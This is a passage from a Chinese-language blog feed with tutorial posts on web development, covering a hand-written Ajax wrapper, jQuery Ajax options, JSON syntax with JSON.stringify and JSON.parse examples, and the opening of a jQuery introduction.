这种格式*/</span></span><br><span class="line">    <span class="keyword">var</span> dataStr = <span class="string">''</span>; <span class="comment">/*数据字符串*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">        dataStr += key+<span class="string">'='</span>+data[key]+<span class="string">'&amp;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dataStr = dataStr &amp;&amp; dataStr.slice(<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">/*ajax 编程*/</span></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    <span class="comment">/*请求行*/</span></span><br><span class="line">    <span class="comment">/*(type=='get'?url+'?'+dataStr:url)判断当前的请求类型*/</span></span><br><span class="line">    xhr.open(type,(type==<span class="string">'get'</span>?url+<span class="string">'?'</span>+dataStr:url),<span class="keyword">async</span>);</span><br><span class="line">    <span class="comment">/*请求头*/</span></span><br><span class="line">    <span class="keyword">if</span>(type == <span class="string">'post'</span>)&#123;</span><br><span class="line">        xhr.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*请求主体*/</span></span><br><span class="line">    <span class="comment">/*需要判断请求类型*/</span></span><br><span class="line">    xhr.send(type==<span class="string">'get'</span>?<span class="literal">null</span>:dataStr);</span><br><span class="line">    <span class="comment">/*监听响应状态的改变  响应状态*/</span></span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">/*请求响应完成并且成功*/</span></span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="comment">/*success*/</span></span><br><span class="line">            <span class="keyword">var</span> data = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">var</span> contentType = xhr.getResponseHeader(<span class="string">'Content-Type'</span>);</span><br><span class="line">            <span class="comment">/*如果我们服务器返回的是xml*/</span></span><br><span class="line">            <span class="keyword">if</span>(contentType.indexOf(<span class="string">'xml'</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">                data = xhr.responseXML;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*如果我们的服务器返回的是json字符串*/</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(contentType.indexOf(<span class="string">'json'</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="comment">/*转化json对象*/</span></span><br><span class="line">                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*否则的话他就是字符串*/</span></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                data = xhr.responseText;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*回调 成功处理函数*/</span></span><br><span class="line">            options.success &amp;&amp; options.success(data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*计时请求xhr.status不成功  他也需要的响应完成才认作是一个错误的请求*/</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="comment">/*error*/</span></span><br><span class="line">            options.error &amp;&amp; options.error(<span class="string">'you request fail !'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$.post = <span class="function"><span class="keyword">function</span>(<span class="params">options</span>)</span>&#123;</span><br><span class="line">    options.type = <span class="string">'post'</span>;</span><br><span class="line">    $.ajax(options);</span><br><span class="line">&#125;</span><br><span class="line">$.get = <span class="function"><span class="keyword">function</span>(<span class="params">options</span>)</span>&#123;</span><br><span class="line">    options.type = <span class="string">'get'</span>;</span><br><span class="line">    $.ajax(options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="jQuery的ajax"><a href="#jQuery的ajax" class="headerlink" title="jQuery的ajax"></a>jQuery的ajax</h2><p>jQuery为我们提供了更强大的Ajax封装</p><ul><li><code>$.ajax({})</code><ul><li>可配置方式发起Ajax请求</li></ul></li><li><code>$.get()</code><ul><li>以GET方式发起Ajax请求</li></ul></li><li><code>$.post()</code><ul><li>以POST方式发起Ajax请求</li></ul></li><li><code>$(&#39;form&#39;).serialize()</code><ul><li>序列化表单（即格式化key=val&amp;key=val）</li></ul></li><li><code>url</code><ul><li>接口地址</li></ul></li><li><code>type</code><ul><li>请求方式</li></ul></li><li><code>timeout</code><ul><li>请求超时</li></ul></li><li><code>dataType</code><ul><li>服务器返回格式</li></ul></li><li><code>contentType</code><ul><li>指定请求的 HTTP Content-Type</li></ul></li><li><code>data</code><ul><li>发送请求数据</li></ul></li><li><code>beforeSend: function () {}</code><ul><li>请求发起前调用</li></ul></li><li><code>success</code><ul><li>成功响应后调用</li></ul></li><li><code>error</code><ul><li>错误响应时调用</li></ul></li><li><code>complete</code><ul><li>响应完成时调用（包括成功和失败）</li></ul></li><li>timeout<ul><li>超时时间</li></ul></li><li><code>cache</code><ul><li>对于 GET 请求</li></ul></li><li><code>ifModified</code><ul><li>当为 true 时，jQuery 会为请求的每一个 URL 记录 Last-Modified 和 If-None-Match 响应头的值</li></ul></li><li><code>global</code><ul><li>是否触发上面描述的 Ajax 请求过程中的事件</li></ul></li></ul><p><a href="http://www.w3school.com.cn/jquery/jquery_ref_ajax.asp" target="_blank" rel="noopener">jQuery Ajax介绍</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;服务器、网络基础、相关知识介绍&quot;&gt;&lt;a href=&quot;#服务器、网络基础、相关知识介绍&quot; class=&quot;headerlink&quot; title=&quot;服务器、网络基础、相关知识介绍&quot;&gt;&lt;/a&gt;服务器、网络基础、相关知识介绍&lt;/h2&gt;&lt;h3 id=&quot;服务器介绍：&quot;&gt;&lt;a href=&quot;#服务器介绍：&quot; class=&quot;headerlink&quot; title=&quot;服务器介绍：&quot;&gt;&lt;/a&gt;服务器介绍：&lt;/h3&gt;&lt;h4 id=&quot;常见的服务器软件有：&quot;&gt;&lt;a href=&quot;#常见的服务器软件有：&quot; class=&quot;headerlink&quot; title=&quot;常见的服务器软件有：&quot;&gt;&lt;/a&gt;常见的服务器软件有：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;文件服务器：Server-U、FileZilla、VsFTP等（FTP是File Transfer Protocol文件传输协议）；&lt;/li&gt;
&lt;li&gt;数据库服务器：oracle、mysql、SQL server、DB2、ACCESS等；&lt;/li&gt;
&lt;li&gt;邮件服务器：Postfix、Sendmail等；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP服务器&lt;/strong&gt;：Apache、Nginx、IIS、Tomcat、NodeJS等；&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;按照不同的划分标准，服务可划分为以下类型：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Ajax系列" scheme="http://yoursite.com/categories/Ajax%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Ajax" scheme="http://yoursite.com/tags/Ajax/"/>
    
  </entry>
  
  <entry>
    <title>JSON数据</title>
    <link href="http://yoursite.com/2015/12/06/JSON%E6%95%B0%E6%8D%AE/"/>
    <id>http://yoursite.com/2015/12/06/JSON数据/</id>
    <published>2015-12-05T16:00:00.000Z</published>
    <updated>2018-06-01T06:23:23.440Z</updated>
    
    <content type="html"><![CDATA[<p>JSON (JavaScript Object Notion, JavaScript 对象表示法)</p><p>JSON 是 JavaScript 的一个严格的子集，它是一种数据格式，而不是一种编程语言。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>JSON 语法可以表示以下三种类型的值：</p><p><strong>简单值</strong>：使用 JavaScript 相同的语法，可以在 JSON 中表示字符串、数值、布尔值和 null，不支持 undefined。</p><p><strong>对象</strong>：对象作为一种复杂数据类型，表示的是一组无序的键值对的值，每个键值对的值可以是简单类型，也可以是复杂类型。</p><p><strong>数组</strong>：数组也是一种复杂数据类型，表示一组有序的值的列表，可以通过数值索引来访问其中的值。数组的值也可以是任意类型-简单值、对象或数组。</p><p>JSON 对象不支持变量、函数或对象实例，它就是一种表示数据结构化的数据的格式，虽然与 JavaScript 中表示数据的某些语法相同，但它并不局限于 JavaScript 的范畴</p><a id="more"></a><h3 id="简单值"><a href="#简单值" class="headerlink" title="简单值"></a>简单值</h3><ul><li>5 这是 JSON 表示数值 5 的方式。</li><li>“str” 这是 JSON 表示字符串的方式。</li></ul><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">"Hiraku"</span>,</span><br><span class="line">  age: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 JSON 表示为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"Hiraku"</span>,</span><br><span class="line">  <span class="string">"age"</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"Hiraku"</span>,</span><br><span class="line">  <span class="string">"age"</span>: <span class="number">25</span>,</span><br><span class="line">  <span class="string">"school"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"name"</span>: <span class="string">"Shantou University"</span>,</span><br><span class="line">      <span class="string">"location"</span>: <span class="string">"Guangdong"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"name"</span>: <span class="string">"Technology of LanZhou University"</span>,</span><br><span class="line">      <span class="string">"location"</span>: <span class="string">"Gansu"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>JSON 中的复杂数据是数组。 JSON 数组采用的就是 JavaScript 中的数字字面量的形式。</p><p>如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">25</span>, <span class="string">"Hiraku"</span>, <span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>JSON 数组也没有变量和分号。把数组和对象结合起来，可以构成更复杂的数据集合。</p><p>如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">    <span class="string">"authors"</span>: [</span><br><span class="line">      <span class="string">"Hirkau"</span>, </span><br><span class="line">      <span class="string">"Herscharl"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"HTML"</span>,</span><br><span class="line">    <span class="string">"authors"</span>: [</span><br><span class="line">      <span class="string">"HuangShan"</span>, </span><br><span class="line">      <span class="string">"Jack"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"edition"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"year"</span>: <span class="number">2012</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"Java"</span>,</span><br><span class="line">    <span class="string">"authors"</span>: [</span><br><span class="line">      <span class="string">"TangTang"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"edition"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"year"</span>: <span class="number">2015</span></span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="JSON-解析和序列化"><a href="#JSON-解析和序列化" class="headerlink" title="JSON 解析和序列化"></a>JSON 解析和序列化</h2><p>JSON 数据可以解析为 JavaScript 对象优势及其明显。</p><h3 id="JSON-对象"><a href="#JSON-对象" class="headerlink" title="JSON 对象"></a>JSON 对象</h3><p>eval() 函数可以解析、解释并返回 JavaScript 对象和数组。</p><p>两个重要方法：</p><ul><li><code>JSON.stringify()</code><ul><li>把 JavaScript 对象序列化为 JSON 字符串</li></ul></li><li><code>JSON.parse()</code><ul><li>把 JSON 字符串解析为原生的 JavaScript 值</li></ul></li></ul><h3 id="JSON-stringify-详解"><a href="#JSON-stringify-详解" class="headerlink" title="JSON.stringify() 详解"></a>JSON.stringify() 详解</h3><p>出来要序列化的 JavaScript 对象外，还可以接收另外两个参数，这两个参数用于指定以不同方式序列化 JavaScript 对象。第一个参数是个过滤器，可以是一个数组，也可以是一个函数，第二个参数是一个选择，表示是否在 JSON 字符串中保留缩进。</p><p>第二个参数是数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Hirkau"</span>, </span><br><span class="line">    <span class="string">"Herscharl"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, [<span class="string">"title"</span>, <span class="string">"edition"</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(jsonText); <span class="comment">// &#123;"title":"JavaScript","edition":3&#125;</span></span><br></pre></td></tr></table></figure><p>第二个参数是函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Hirkau"</span>, </span><br><span class="line">    <span class="string">"Herscharl"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(key)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"authors"</span>:</span><br><span class="line">      <span class="keyword">return</span> value.join(<span class="string">","</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"year"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"year"</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"edition"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(jsonText); <span class="comment">// &#123;"title":"JavaScript","authors":"Hirkau,Herscharl","year":"year"&#125;</span></span><br></pre></td></tr></table></figure><p>第三个参数控制结果中的缩进和空白符：最大缩进空格为 10 。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Hirkau"</span>, </span><br><span class="line">    <span class="string">"Herscharl"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, <span class="literal">null</span>, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(jsonText);</span><br></pre></td></tr></table></figure><p>这段代码输出结果是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">    <span class="string">"authors"</span>: [</span><br><span class="line">        <span class="string">"Hirkau"</span>,</span><br><span class="line">        <span class="string">"Herscharl"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个参数是字符时：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Hirkau"</span>, </span><br><span class="line">    <span class="string">"Herscharl"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, <span class="literal">null</span>, <span class="string">" - -"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(jsonText);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> - -<span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line"> - -<span class="string">"authors"</span>: [</span><br><span class="line"> - - - -<span class="string">"Hirkau"</span>,</span><br><span class="line"> - - - -<span class="string">"Herscharl"</span></span><br><span class="line"> - -],</span><br><span class="line"> - -<span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line"> - -<span class="string">"year"</span>: <span class="number">2013</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="toJSON-方法"><a href="#toJSON-方法" class="headerlink" title="toJSON() 方法"></a>toJSON() 方法</h3><p>在 JSON.stringify() 方法不能满足某些独享进行自定义序列化的需求。可以给对象定义 toJSON() 方法，返回自身的 JSON 数据格式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Hirkau"</span>, </span><br><span class="line">    <span class="string">"Herscharl"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2013</span>,</span><br><span class="line">    toJSON: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book);</span><br><span class="line"><span class="built_in">console</span>.log(jsonText); <span class="comment">// "JavaScript"</span></span><br></pre></td></tr></table></figure><p><strong>序列化的顺序：</strong></p><p>(1) 如果存在 toJSON() 方法而且能通过它取得有效的值，则调用该方法，否则，返回对象本身；</p><p>(2) 如果提供了第二个参数，应用这个函数过滤器，传入函数过滤器的值是第 (1) 步返回的值；</p><p>(3) 对第 (2) 步返回的每个值进行相应的序列化；</p><p>(4) 如果提供了第三个参数，执行相应的序列化。</p><h2 id="解析选项"><a href="#解析选项" class="headerlink" title="解析选项"></a>解析选项</h2><p>JSON.parse() 方法也可以接收另一个参数，该参数是一个函数，将在每个键值对上调用。为了区别 JSON.stringify() 接收的替换(过滤)函数，这个函数被称为还原函数，实际上这两个函数的签名是相同的-接收两个参数，一个键和一个值，而且都需要返回一个值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Hirkau"</span>, </span><br><span class="line">    <span class="string">"Herscharl"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2013</span>,</span><br><span class="line">  releaseDate: <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2011</span>, <span class="number">11</span>, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book);</span><br><span class="line"><span class="keyword">var</span> bookCopy = <span class="built_in">JSON</span>.parse(jsonText, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (key == <span class="string">"releaseDate"</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(bookCopy.releaseDate.getFullYear()); <span class="comment">// 2011</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JSON (JavaScript Object Notion, JavaScript 对象表示法)&lt;/p&gt;
&lt;p&gt;JSON 是 JavaScript 的一个严格的子集，它是一种数据格式，而不是一种编程语言。&lt;/p&gt;
&lt;h2 id=&quot;语法&quot;&gt;&lt;a href=&quot;#语法&quot; class=&quot;headerlink&quot; title=&quot;语法&quot;&gt;&lt;/a&gt;语法&lt;/h2&gt;&lt;p&gt;JSON 语法可以表示以下三种类型的值：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简单值&lt;/strong&gt;：使用 JavaScript 相同的语法，可以在 JSON 中表示字符串、数值、布尔值和 null，不支持 undefined。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对象&lt;/strong&gt;：对象作为一种复杂数据类型，表示的是一组无序的键值对的值，每个键值对的值可以是简单类型，也可以是复杂类型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数组&lt;/strong&gt;：数组也是一种复杂数据类型，表示一组有序的值的列表，可以通过数值索引来访问其中的值。数组的值也可以是任意类型-简单值、对象或数组。&lt;/p&gt;
&lt;p&gt;JSON 对象不支持变量、函数或对象实例，它就是一种表示数据结构化的数据的格式，虽然与 JavaScript 中表示数据的某些语法相同，但它并不局限于 JavaScript 的范畴&lt;/p&gt;
    
    </summary>
    
      <category term="JSON系列" scheme="http://yoursite.com/categories/JSON%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="JSON" scheme="http://yoursite.com/tags/JSON/"/>
    
  </entry>
  
  <entry>
    <title>jQuery</title>
    <link href="http://yoursite.com/2015/11/28/jQuery/"/>
    <id>http://yoursite.com/2015/11/28/jQuery/</id>
    <published>2015-11-27T16:00:00.000Z</published>
    <updated>2018-06-01T06:08:44.837Z</updated>
    
    <content type="html"><![CDATA[<p>使用 CSS 选择器来识别一组文档元素，并返回一个对象表示这些元素。返回的对象提供了大量的方法来批量操作匹配的元素。</p><h2 id="jQuery前戏"><a href="#jQuery前戏" class="headerlink" title="jQuery前戏"></a>jQuery前戏</h2><h3 id="js不足"><a href="#js不足" class="headerlink" title="js不足"></a>js不足</h3><ul><li>代码很麻烦，冗余</li><li>浏览器兼容性问题</li><li>入口函数只能写一个，写了多个，后面的会覆盖前面的问题</li><li>js的代码容错性比较差（比较容易出错）</li><li>实现一些简单的动画比较麻烦</li></ul><h3 id="什么是jquery？"><a href="#什么是jquery？" class="headerlink" title="什么是jquery？"></a>什么是jquery？</h3><p>jquery是一个js库。jquery就是一个js文件.</p><p>什么是js库？js库其实就是把一些我们常用到的方法封装到一个单独的js文件里面，当我们想用的时候，引入它。（common.js animate.js）</p><p>特点：</p><ul><li>丰富强大的语法</li><li>高效的查询</li><li>一套有用的方法</li><li>强大的函数式编程技巧，批量操作元素集</li><li>简洁的语言用法</li></ul><a id="more"></a><h3 id="引包"><a href="#引包" class="headerlink" title="引包"></a>引包</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"jquery-1.12.4.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h2><p><code>jQuery()</code> 全局函数，对应于一个快捷名：<code>$</code>。<code>jQuery()</code> 是工厂函数，不使用 <code>new</code> 关键字。</p><h3 id="入口函数"><a href="#入口函数" class="headerlink" title="入口函数"></a>入口函数</h3><h4 id="js入口函数"><a href="#js入口函数" class="headerlink" title="js入口函数"></a>js入口函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;...&#125;;</span><br></pre></td></tr></table></figure><h4 id="jQuery入口函数1"><a href="#jQuery入口函数1" class="headerlink" title="jQuery入口函数1"></a>jQuery入口函数1</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;...&#125;);</span><br></pre></td></tr></table></figure><h4 